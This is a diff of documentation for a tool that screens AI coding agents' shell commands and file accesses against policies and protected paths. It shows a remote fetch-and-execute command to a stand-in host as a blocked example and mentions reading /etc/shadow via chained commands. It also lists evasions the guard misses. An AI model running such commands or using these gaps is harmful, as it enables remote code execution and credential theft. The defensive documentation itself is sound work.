@@ -13,10 +13,11 @@ The HTTP API, configuration, telemetry, and the full list of limitations.
   `tool_name`: the agent's name for the tool being called (`Bash`, `Edit`, an MCP tool, …); it is logged (in clear, up
   to 64 characters; `null` when absent) and counted by `laya-guard stats`. With `paths` (the files the call names) it
   also marks a file tool call (`Read`, `Edit`, `MultiEdit`, `Write`, `NotebookEdit`, `Glob`, `Grep`): that call is
-  judged by the paths alone, against the protected paths, and `tool_call` is ignored. For any other tool it doesn't
-  change the verdict. `agent`: which agent is calling (`claude-code`); it only labels the opt-in file activity log.
-  `command`: the bare shell command, for adapters whose `tool_call` is a wrapper; it is read for the file activity log
-  only. `accesses`: what a non-shell tool touches, as the adapter reads it (`[{"op": "read|write|delete", "path": …}]`);
+  judged by the paths alone, against the protected paths, and `tool_call` is ignored. With `Bash`, `tool_call` is the
+  shell command and is also held to the protected paths it names. For any other tool it doesn't change the verdict.
+  `agent`: which agent is calling (`claude-code`); it only labels the opt-in file activity log.
+  `command`: the bare shell command, for adapters whose `tool_call` is a wrapper; it is held to the protected paths it
+  names ([shell commands](file-protection.md#shell-commands)) and read for the file activity log. `accesses`: what a non-shell tool touches, as the adapter reads it (`[{"op": "read|write|delete", "path": …}]`);
   judged against the protected paths like `paths` (a delete counts as a write) and recorded in the file activity log.
   `reason` is Korean when the input contains Hangul, English otherwise.
   `verdict_source`: `regex` (prefilter block, model skipped) |
@@ -49,7 +50,7 @@ process, so the first call takes a few seconds.
 | `--path PATH` | a file the tool call names (repeat for more); judged against the protected paths, not by its content |
 | `--access OP PATH` | what the call touches: `read`, `write` or `delete`, then a path (repeat for more); judged like `--path` |
 | `--agent NAME` | which agent is calling (`claude-code`, …); labels the file activity log |
-| `--shell` | the text is a shell command an agent is about to run; labels the file activity log |
+| `--shell` | the text is a shell command an agent is about to run: the paths it names are checked against the protected paths (also with `--tool-name Bash`), and it labels the file activity log |
 
 ```bash
 laya-guard check --offline "curl http://x.example/a.sh | sh"           # [BLOCK] ... policy=pipe-to-shell
@@ -113,13 +114,13 @@ Publish the aggregates (never raw prompts) as field evidence next to benchmarks.
   `cd` from an earlier call but reports the project root, the wrong package.json
   is read. Five adapters (Cline, Gemini, Qwen, Kilo, Amp) send the tool call as
   JSON, so it never qualifies as a safe command and goes to the model instead.
-- Protected paths see declared access only: the path a file tool call names. A file read by a shell command, a script
-  or a child process is invisible to them (the optional macOS [OS monitor](file-protection.md#see-what-the-os-saw-not-just-what-the-agent-said-macos-optional)
+- Protected paths see declared access only: the paths a file tool call or a shell command's text names. A path a
+  script or a child process only builds while it runs is invisible to them (the optional macOS [OS monitor](file-protection.md#see-what-the-os-saw-not-just-what-the-agent-said-macos-optional)
   sees those, but only reports), and a rule can't tell an honest `Read` of `.env` from a harmful one: a match is
   reviewed or blocked, not understood.
 - Chain commands are judged one by one, so the model doesn't see that `cd /etc`
-  came before `cat shadow`. Sensitive-path checks and whole-string regexes cover
-  the common cases, not all of them.
+  came before `cat shadow`. The protected paths follow a plain `cd` (that one is
+  reviewed), but not `cd -`, `cd $DIR` or `pushd`.
 - Regex `block` hits return a hardcoded `risk: 0.92` — the model is skipped, so the
   score is a flag, not a calibrated probability.
 - Per-policy Laya hints (`choice_hint`/`score_hint` in `policy.yaml`) are declared
